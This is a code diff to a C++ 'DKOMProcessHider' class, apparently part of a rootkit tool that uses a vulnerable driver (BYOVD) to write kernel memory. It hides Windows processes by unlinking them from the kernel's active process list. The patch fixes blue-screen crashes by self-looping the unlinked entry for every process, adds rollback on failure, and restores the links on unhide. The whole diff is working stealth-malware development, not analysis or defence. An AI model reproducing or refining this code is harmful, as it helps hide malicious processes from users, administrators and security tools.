@@ -3473,13 +3473,32 @@ bool DKOMProcessHider::HideProcessByPid(DWORD pid) {
         return false;
     }
 
-    // 5. 自循环加固 (仅非当前进程)
-    //   当前进程走 DisableAll→UnhideAll 正常路径, 无需自循环
-    //   非当前进程 (basic.exe) 可能被外部 TerminateProcess, 需自循环防止 0x139
-    if (pid != GetCurrentProcessId()) {
-        SelfLoopHarden(kma, entry);
-        // SelfLoopHarden 失败不致命 — basic.exe 仍可正常工作,
-        // 只是不能被外部 TerminateProcess (会被 DisableAll→UnhideAll 先挂回)
+    // 5. 自循环加固 (所有进程, 包括当前进程)
+    //   ★ BUILD 558 FIX: 当前进程也必须自循环 (7/18-7/19 三次 0x139 param 3 蓝屏根因)
+    //     根因: PerformUnlink 后 current.Flink/Blink 保留原值 (指向 prev/next),
+    //           但 prev.Flink=next, next.Blink=prev (current 被跳过).
+    //           进程崩溃退出时 PspExitProcess 调用 RemoveEntryList 检查:
+    //             current.Flink->Blink == current → next.Blink == current → FALSE
+    //           → BugCheck 0x139 param 3 (LIST_ENTRY corruption)
+    //     修复: current.Flink=&current, current.Blink=&current (自循环)
+    //           RemoveEntryList 检查: (&current)->Blink == current → current == current ✓
+    //     注意: SelfLoopHarden 不影响 UnhideAll 的 listIntact 检查
+    //           (listIntact 检查 prev.Flink/next.Blink, 不检查 current.Flink/Blink)
+    //           但 UnhideAll listIntact=true 路径必须额外恢复 current.Flink/Blink
+    //           (见 UnhideProcessByPid 的 BUILD 558 FIX)
+    //     历史记录: 7/18 21:42, 22:40, 7/19 16:43 三次 0x139 param 3 蓝屏
+    if (!SelfLoopHarden(kma, entry)) {
+        // ★ BUILD 558 FIX: SelfLoopHarden 失败 — 必须回滚 PerformUnlink, 恢复链表完整性
+        //   不设置 hidden=true, 避免 UnhideAll 误操作孤立节点
+        //   回滚: 写 next.Blink=&current, prev.Flink=&current (恢复 current 在链表中)
+        ByovdDiag("DKOM.HideByPid: SelfLoopHarden FAIL — rolling back PerformUnlink (pid=%u)\n", pid);
+        uint64_t currentLinksVA = eproc + m_linksOffset;
+        kma.Write(entry->flinkBackup + 8, currentLinksVA);  // next.Blink = &current (恢复)
+        kma.Write(entry->blinkBackup, currentLinksVA);      // prev.Flink = &current (恢复)
+        entry->eprocess    = 0;
+        entry->flinkBackup = 0;
+        entry->blinkBackup = 0;
+        return false;
     }
 
     entry->hidden = true;
@@ -3540,19 +3559,30 @@ bool DKOMProcessHider::UnhideProcessByPid(DWORD pid) {
 
     if (listIntact) {
         // 链表未被修改 — 使用原逻辑恢复 (正确将 current 重新链入)
+        // ★ BUILD 558 FIX: 必须同时恢复 current.Flink/Blink
+        //   原因: HideProcessByPid 现在对所有进程调用 SelfLoopHarden,
+        //         current.Flink/Blink 被改为 &current (自循环).
+        //         若只写 prev.Flink/next.Blink, 链表会变成:
+        //           prev → current → (current.Flink=&current 自循环) → 死循环
+        //         必须恢复 current.Flink=next, current.Blink=prev 才能完整链入.
+        //   兼容性: 若 SelfLoopHarden 未被调用 (旧版), w3/w4 写入与原值相同, 无副作用.
         bool w1 = kma.Write(entry->blinkBackup, currentLinksVA);       // prev.Flink = &current.ActiveProcessLinks
         bool w2 = kma.Write(entry->flinkBackup + 8, currentLinksVA);   // next.Blink = &current.ActiveProcessLinks
+        bool w3 = kma.Write(currentLinksVA, entry->flinkBackup);       // current.Flink = next (恢复原始值)
+        bool w4 = kma.Write(currentLinksVA + 8, entry->blinkBackup);   // current.Blink = prev (恢复原始值)
 
         ByovdDiag("DKOM.UnhideByPid: list intact — w1(prev.Flink)=%d w2(next.Blink)=%d "
+                  "w3(cur.Flink)=%d w4(cur.Blink)=%d "
                   "(pid=%u EPROC=0x%llX linksOffset=0x%X currentLinks=0x%llX)\n",
-            w1?1:0, w2?1:0, pid, (unsigned long long)entry->eprocess, m_linksOffset,
+            w1?1:0, w2?1:0, w3?1:0, w4?1:0,
+            pid, (unsigned long long)entry->eprocess, m_linksOffset,
             (unsigned long long)currentLinksVA);
 
         entry->hidden = false;
         entry->eprocess = 0;
         entry->flinkBackup = 0;
         entry->blinkBackup = 0;
-        return (w1 && w2);
+        return (w1 && w2 && w3 && w4);
     } else {
         // 链表被修改 — 有新进程 C 插入到 prev 和 next 之间
         // 使用"自循环"回退: current->Flink=&current, current->Blink=&current
